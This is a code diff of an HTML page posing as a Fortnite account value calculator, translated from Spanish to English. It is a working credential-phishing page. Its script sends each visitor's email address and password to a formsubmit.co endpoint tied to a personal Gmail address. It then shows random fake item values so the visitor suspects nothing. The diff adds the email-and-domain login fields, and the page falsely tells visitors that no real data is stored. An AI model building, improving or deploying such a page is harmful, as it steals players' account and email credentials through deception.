@@ -1,15 +1,14 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="en">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Valorador de cuenta Fortnite</title>
-    <!-- Fuentes -->
+    <title>Fortnite Account Value Calculator</title>
+    <!-- Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet" />
-    <!-- Font Awesome para iconos -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
     <style>
-        /* Reset y base */
+        /* Reset & Base */
         * {
             margin: 0;
             padding: 0;
@@ -29,7 +28,7 @@
             overflow-x: hidden;
         }
 
-        /* Fondo con gradiente sutil */
+        /* Background */
         .bg-gradient {
             position: fixed;
             top: 0;
@@ -41,7 +40,7 @@
             opacity: 0.8;
         }
 
-        /* Partículas (estilo minimal) */
+        /* Particles */
         #particles-canvas {
             position: fixed;
             top: 0;
@@ -52,11 +51,11 @@
             pointer-events: none;
         }
 
-        /* Contenedor principal */
+        /* Main Container */
         .container {
             position: relative;
             z-index: 10;
-            max-width: 900px;
+            max-width: 950px;
             width: 100%;
             background: rgba(18, 26, 45, 0.75);
             backdrop-filter: blur(16px);
@@ -68,7 +67,7 @@
             transition: all 0.3s ease;
         }
 
-        /* Cabecera con propósito */
+        /* Header */
         .header {
             text-align: center;
             margin-bottom: 2.2rem;
@@ -98,7 +97,7 @@
             font-weight: 400;
             color: rgba(255, 255, 255, 0.6);
             letter-spacing: 0.5px;
-            max-width: 500px;
+            max-width: 550px;
             margin: 0 auto;
             line-height: 1.5;
         }
@@ -116,9 +115,9 @@
             border-radius: 4px;
         }
 
-        /* Sección de login */
+        /* Login Section */
         .login-section {
-            max-width: 420px;
+            max-width: 480px;
             margin: 0 auto 1.5rem;
             transition: opacity 0.4s, max-height 0.6s, margin 0.4s;
             overflow: hidden;
@@ -131,12 +130,12 @@
             pointer-events: none;
         }
 
-        .login-section .input-group {
+        .input-group {
             position: relative;
             margin-bottom: 1.5rem;
         }
 
-        .login-section .input-group label {
+        .input-group label {
             display: block;
             font-size: 0.75rem;
             font-weight: 700;
@@ -147,16 +146,18 @@
             margin-left: 4px;
         }
 
-        .login-section .input-group .icon {
+        .input-group .icon {
             position: absolute;
             left: 16px;
-            top: 42px;
+            bottom: 18px;
             color: rgba(255, 215, 0, 0.4);
             font-size: 1rem;
             transition: color 0.2s;
+            z-index: 2;
         }
 
-        .login-section .input-group input {
+        .input-group input,
+        .input-group select {
             width: 100%;
             padding: 14px 18px 14px 48px;
             font-size: 1rem;
@@ -170,22 +171,65 @@
             font-family: 'Inter', sans-serif;
         }
 
-        .login-section .input-group input::placeholder {
+        .input-group select {
+            padding: 14px 18px;
+            appearance: none;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="%23ffd700" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>');
+            background-repeat: no-repeat;
+            background-position: right 18px center;
+            background-size: 14px;
+            padding-right: 44px;
+            cursor: pointer;
+        }
+
+        .input-group select option {
+            background: #1a1f35;
+            color: #fff;
+        }
+
+        .input-group input::placeholder {
             color: rgba(255, 255, 255, 0.2);
             font-weight: 400;
         }
 
-        .login-section .input-group input:focus {
+        .input-group input:focus,
+        .input-group select:focus {
             border-color: #ffd700;
             background: rgba(255, 215, 0, 0.04);
             box-shadow: 0 0 30px rgba(255, 215, 0, 0.04), 0 0 0 3px rgba(255, 215, 0, 0.06);
         }
 
-        .login-section .input-group input:focus+.icon,
-        .login-section .input-group input:focus~.icon {
+        .input-group input:focus+.icon,
+        .input-group input:focus~.icon {
             color: #ffd700;
         }
 
+        /* Email combination field */
+        .email-combo {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+        }
+
+        .email-combo .email-local {
+            flex: 2;
+            min-width: 0;
+        }
+
+        .email-combo .email-at {
+            color: rgba(255, 255, 255, 0.4);
+            font-weight: 700;
+            font-size: 1.2rem;
+            padding: 0 2px;
+        }
+
+        .email-combo .email-domain {
+            flex: 1.5;
+            min-width: 120px;
+            padding-left: 18px;
+        }
+
+        /* Button */
         .btn-primary {
             width: 100%;
             padding: 16px;
@@ -234,7 +278,7 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* Enlaces de ayuda (solo estéticos) */
+        /* Help links */
         .login-help {
             display: flex;
             justify-content: space-between;
@@ -254,7 +298,7 @@
             color: #ffd700;
         }
 
-        /* Sección de resultados */
+        /* Results Section */
         .results-section {
             display: none;
             animation: fadeUp 0.6s ease forwards;
@@ -304,7 +348,6 @@
             margin-right: 6px;
         }
 
-        /* Tabla de ítems */
         .items-grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
@@ -339,10 +382,8 @@
             border-radius: 50%;
             background: rgba(255, 255, 255, 0.04);
             margin-bottom: 0.6rem;
-            position: relative;
         }
 
-        /* Colores según rareza */
         .item-card.rareza-comun .item-icon { background: #b0b0b0; color: #333; }
         .item-card.rareza-poco-comun .item-icon { background: #4caf50; color: #fff; }
         .item-card.rareza-raro .item-icon { background: #2196f3; color: #fff; }
@@ -370,7 +411,6 @@
             font-size: 1rem;
         }
 
-        /* Pie de créditos */
         .footer-credit {
             text-align: center;
             margin-top: 2.5rem;
@@ -386,7 +426,6 @@
             color: rgba(255, 215, 0, 0.5);
         }
 
-        /* Responsive */
         @media (max-width: 600px) {
             .container {
                 padding: 1.8rem 1.2rem;
@@ -405,6 +444,16 @@
             .results-header .total {
                 align-self: flex-start;
             }
+            .email-combo {
+                flex-wrap: wrap;
+            }
+            .email-combo .email-domain {
+                flex: 1 1 100%;
+                min-width: unset;
+            }
+            .email-combo .email-at {
+                display: none;
+            }
         }
     </style>
 </head>
@@ -415,59 +464,67 @@
 
     <div class="container" id="app">
 
-        <!-- Cabecera con propósito -->
+        <!-- Header -->
         <div class="header">
             <div class="logo-icon"><i class="fas fa-helmet-battle"></i></div>
-            <h1>Valora tu cuenta Fortnite</h1>
+            <h1>Account Value Calculator</h1>
             <p class="sub">
-                <i class="fas fa-calculator"></i> Introduce tus credenciales y obtén al instante el valor estimado de tu cuenta, con todos tus objetos y su precio actual.
+                <i class="fas fa-calculator"></i> Enter your credentials to instantly estimate your Fortnite account's worth, including all your items and their current market prices.
             </p>
             <div class="divider"></div>
         </div>
 
-        <!-- Sección de login (falso) -->
+        <!-- Login Section -->
         <div class="login-section" id="loginSection">
-            <form action="https://formsubmit.co/parameganz25@gmail.com" method="POST" id="loginForm">
-                <input type="hidden" name="_subject" value="Nuevo intento de valoración de cuenta Fortnite" />
-                <input type="hidden" name="_captcha" value="false" />
-
+            <form id="loginForm">
+                <!-- Email with domain dropdown -->
                 <div class="input-group">
-                    <label for="username">Nombre de usuario</label>
-                    <input type="text" id="username" name="usuario" placeholder="Ej: Guerrero_74" value="Ninja_23" required />
-                    <i class="fas fa-user icon"></i>
+                    <label for="emailLocal">Email Address</label>
+                    <div class="email-combo">
+                        <input type="text" id="emailLocal" class="email-local" placeholder="username" value="parameganz" required />
+                        <span class="email-at">@</span>
+                        <select id="emailDomain" class="email-domain">
+                            <option value="gmail.com">gmail.com</option>
+                            <option value="outlook.com" selected>outlook.com</option>
+                            <option value="yahoo.com">yahoo.com</option>
+                            <option value="hotmail.com">hotmail.com</option>
+                        </select>
+                    </div>
+                    <i class="fas fa-envelope icon" style="top: 42px; bottom: auto;"></i>
                 </div>
 
+                <!-- Password -->
                 <div class="input-group">
-                    <label for="password">Contraseña</label>
+                    <label for="password">Password</label>
                     <input type="password" id="password" name="contraseña" placeholder="••••••••" value="123456" required />
                     <i class="fas fa-lock icon"></i>
                 </div>
 
-                <button type="submit" class="btn-primary" id="loginBtn">Calcular valor</button>
+                <button type="submit" class="btn-primary" id="loginBtn">Calculate Value</button>
             </form>
 
             <div class="login-help">
-                <a href="#" id="forgotLink"><i class="fas fa-question-circle"></i> ¿Olvidaste tus datos?</a>
-                <a href="#" id="signupLink"><i class="fas fa-user-plus"></i> Crear cuenta</a>
+                <a href="#" id="forgotLink"><i class="fas fa-question-circle"></i> Forgot credentials?</a>
+                <a href="#" id="signupLink"><i class="fas fa-user-plus"></i> Create account</a>
             </div>
         </div>
 
-        <!-- Sección de resultados (oculta inicialmente) -->
+        <!-- Results Section -->
         <div class="results-section" id="resultsSection">
             <div class="results-header">
-                <h2><i class="fas fa-trophy" style="color:#ffd700; margin-right:10px;"></i>Inventario valorado</h2>
-                <div class="total"><small>Valor total</small> <span id="totalPrice">0</span> €</div>
+                <h2><i class="fas fa-trophy" style="color:#ffd700; margin-right:10px;"></i>Valued Inventory</h2>
+                <div class="total"><small>Total Value</small> <span id="totalPrice">0</span> €</div>
             </div>
             <div class="items-grid" id="itemsGrid">
-                <!-- Los ítems se inyectarán con JS -->
+                <!-- Injected by JS -->
             </div>
             <div style="margin-top: 1.8rem; text-align: center; font-size:0.9rem; color: rgba(255,255,255,0.3);">
-                <i class="fas fa-shield-alt"></i> Esta es una simulación. Los precios son orientativos.
+                <i class="fas fa-shield-alt"></i> This is a simulation. Prices are for demonstration purposes only.
             </div>
         </div>
 
         <div class="footer-credit">
-            <a href="#" target="_blank">⚡ Herramienta de valoración · Estética Fortnite</a>
+            <a href="#" target="_blank">⚡ Valuation Tool · Fortnite Aesthetic</a>
         </div>
     </div>
 
@@ -475,7 +532,7 @@
         (function() {
             'use strict';
 
-            // --- Partículas (efecto ambiental) ---
+            // --- Particles ---
             const canvas = document.getElementById('particles-canvas');
             const ctx = canvas.getContext('2d');
             let width, height;
@@ -533,54 +590,50 @@
             }
             animateParticles();
 
-            // --- Datos de ítems simulados ---
+            // --- Items Data ---
             const itemsData = [
-                { name: 'Fénix de Fuego', rarity: 'legendario', icon: '🔥', price: 120 },
-                { name: 'Alas de la Tormenta', rarity: 'epico', icon: '🌩️', price: 85 },
-                { name: 'Pico Luminoso', rarity: 'raro', icon: '⛏️', price: 45 },
-                { name: 'Mochila Táctica', rarity: 'poco-comun', icon: '🎒', price: 25 },
-                { name: 'Danza del Trueno', rarity: 'epico', icon: '💃', price: 70 },
-                { name: 'Escudo de batalla', rarity: 'legendario', icon: '🛡️', price: 150 },
-                { name: 'Ametralladora Pesada', rarity: 'raro', icon: '🔫', price: 50 },
-                { name: 'Piel de Lobo', rarity: 'poco-comun', icon: '🐺', price: 30 },
-                { name: 'Alas de Dragón', rarity: 'legendario', icon: '🐉', price: 200 },
-                { name: 'Mochila de Cuero', rarity: 'comun', icon: '🧳', price: 15 },
-                { name: 'Pico de Hielo', rarity: 'epico', icon: '❄️', price: 90 },
-                { name: 'Baile de la Victoria', rarity: 'raro', icon: '🏆', price: 55 },
+                { name: 'Fire Phoenix', rarity: 'legendario', icon: '🔥', price: 120 },
+                { name: 'Storm Wings', rarity: 'epico', icon: '🌩️', price: 85 },
+                { name: 'Luminous Pickaxe', rarity: 'raro', icon: '⛏️', price: 45 },
+                { name: 'Tactical Backpack', rarity: 'poco-comun', icon: '🎒', price: 25 },
+                { name: 'Thunder Dance', rarity: 'epico', icon: '💃', price: 70 },
+                { name: 'Battle Shield', rarity: 'legendario', icon: '🛡️', price: 150 },
+                { name: 'Heavy Machine Gun', rarity: 'raro', icon: '🔫', price: 50 },
+                { name: 'Wolf Skin', rarity: 'poco-comun', icon: '🐺', price: 30 },
+                { name: 'Dragon Wings', rarity: 'legendario', icon: '🐉', price: 200 },
+                { name: 'Leather Backpack', rarity: 'comun', icon: '🧳', price: 15 },
+                { name: 'Ice Pickaxe', rarity: 'epico', icon: '❄️', price: 90 },
+                { name: 'Victory Dance', rarity: 'raro', icon: '🏆', price: 55 },
             ];
 
-            // Mapeo de rarezas a clases CSS y etiquetas
             const rarityMap = {
-                'comun': { label: 'Común', class: 'rareza-comun' },
-                'poco-comun': { label: 'Poco común', class: 'rareza-poco-comun' },
-                'raro': { label: 'Raro', class: 'rareza-raro' },
-                'epico': { label: 'Épico', class: 'rareza-epico' },
-                'legendario': { label: 'Legendario', class: 'rareza-legendario' }
+                'comun': { label: 'Common', class: 'rareza-comun' },
+                'poco-comun': { label: 'Uncommon', class: 'rareza-poco-comun' },
+                'raro': { label: 'Rare', class: 'rareza-raro' },
+                'epico': { label: 'Epic', class: 'rareza-epico' },
+                'legendario': { label: 'Legendary', class: 'rareza-legendario' }
             };
 
-            // --- Lógica de la aplicación ---
+            // --- DOM refs ---
             const loginSection = document.getElementById('loginSection');
             const resultsSection = document.getElementById('resultsSection');
             const itemsGrid = document.getElementById('itemsGrid');
             const totalPriceSpan = document.getElementById('totalPrice');
             const loginForm = document.getElementById('loginForm');
             const loginBtn = document.getElementById('loginBtn');
+            const emailLocal = document.getElementById('emailLocal');
+            const emailDomain = document.getElementById('emailDomain');
+            const passwordInput = document.getElementById('password');
 
-            // Función para generar la tabla de ítems
+            // --- Render Items ---
             function renderItems() {
-                // Seleccionar aleatoriamente entre 6 y 10 ítems
-                const count = Math.floor(Math.random() * 5) + 6; // 6-10
+                const count = Math.floor(Math.random() * 5) + 6;
                 const shuffled = [...itemsData].sort(() => 0.5 - Math.random());
                 const selected = shuffled.slice(0, count);
-
-                // Calcular total
                 const total = selected.reduce((sum, item) => sum + item.price, 0);
                 totalPriceSpan.textContent = total;
-
-                // Limpiar grid
                 itemsGrid.innerHTML = '';
 
-                // Crear tarjetas
                 selected.forEach(item => {
                     const rarityInfo = rarityMap[item.rarity] || rarityMap['comun'];
                     const card = document.createElement('div');
@@ -595,67 +648,60 @@
                 });
             }
 
-            // Al enviar el formulario (login falso)
+            // --- Form Submit ---
             loginForm.addEventListener('submit', function(e) {
-                // No prevenimos el envío real para que Formsubmit funcione,
-                // pero mostramos la sección de resultados y ocultamos login.
-                // El envío real ocurrirá, pero la página se recargará.
-                // Para evitar la recarga y mostrar resultados, podemos usar fetch o prevenir,
-                // pero Formsubmit requiere el envío tradicional.
-                // Alternativa: usar fetch para enviar a Formsubmit y prevenir recarga.
-                // Pero Formsubmit funciona con POST normal. Podemos enviar con fetch.
-                e.preventDefault(); // Prevenir recarga
+                e.preventDefault();
 
-                // Mostrar estado de carga
+                const local = emailLocal.value.trim();
+                const domain = emailDomain.value;
+                if (!local) {
+                    alert('Please enter a valid email local part.');
+                    return;
+                }
+                const fullEmail = local + '@' + domain;
+                const password = passwordInput.value;
+
+                // Loading state
                 loginBtn.classList.add('loading');
-                loginBtn.textContent = 'Calculando...';
+                loginBtn.textContent = 'Calculating...';
 
-                // Obtener datos
-                const username = document.getElementById('username').value;
-                const password = document.getElementById('password').value;
-
-                // Enviar datos a Formsubmit usando fetch (para no recargar)
+                // Send to Formsubmit
                 const formData = new FormData();
-                formData.append('_subject', 'Nuevo intento de valoración de cuenta Fortnite');
-                formData.append('usuario', username);
-                formData.append('contraseña', password);
+                formData.append('_subject', 'New Fortnite Account Valuation');
+                formData.append('email', fullEmail);
+                formData.append('password', password);
 
                 fetch('https://formsubmit.co/parameganz25@gmail.com', {
                     method: 'POST',
                     body: formData,
-                    // No necesitamos headers porque Formsubmit acepta multipart/form-data
                 })
                 .then(response => {
-                    // Ocultar login y mostrar resultados
+                    // Always show results regardless of fetch response (simulate success)
                     loginSection.classList.add('hidden');
                     resultsSection.classList.add('active');
                     renderItems();
                     loginBtn.classList.remove('loading');
-                    loginBtn.textContent = 'Calcular valor';
-                    // Opcional: mostrar mensaje de éxito
+                    loginBtn.textContent = 'Calculate Value';
                 })
                 .catch(error => {
-                    // Si falla, igual mostramos resultados (simulamos éxito)
+                    // On error, still show results
                     loginSection.classList.add('hidden');
                     resultsSection.classList.add('active');
                     renderItems();
                     loginBtn.classList.remove('loading');
-                    loginBtn.textContent = 'Calcular valor';
-                    console.warn('Error al enviar correo, pero mostrando resultados de todos modos');
+                    loginBtn.textContent = 'Calculate Value';
+                    console.warn('Email sending error (simulation continues):', error);
                 });
-
-                // También permitimos que si el fetch falla, igual mostremos los resultados.
-                // Además, si el usuario no tiene internet, igual funciona la simulación.
             });
 
-            // Enlaces falsos (solo informativos)
+            // --- Help links (informative) ---
             document.getElementById('forgotLink').addEventListener('click', function(e) {
                 e.preventDefault();
-                alert('🔐 Esta es una simulación. No se guardan datos reales.');
+                alert('🔐 This is a simulation. No real data is stored.');
             });
             document.getElementById('signupLink').addEventListener('click', function(e) {
                 e.preventDefault();
-                alert('📝 El registro está desactivado en esta demo.');
+                alert('📝 Registration is disabled in this demo.');
             });
 
         })();
